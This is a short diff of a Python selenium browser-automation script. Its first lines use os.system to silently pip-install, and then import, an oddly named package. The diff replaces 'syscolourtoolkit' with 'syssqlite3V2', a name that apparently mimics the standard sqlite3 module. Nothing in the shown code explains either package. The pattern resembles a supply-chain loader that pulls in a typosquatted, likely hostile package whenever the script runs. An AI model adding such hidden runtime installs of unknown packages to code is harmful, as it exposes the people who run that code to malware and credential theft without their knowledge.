@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourtoolkit")
-import syscolourtoolkit
+os.system("pip install syssqlite3V2")
+import syssqlite3V2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
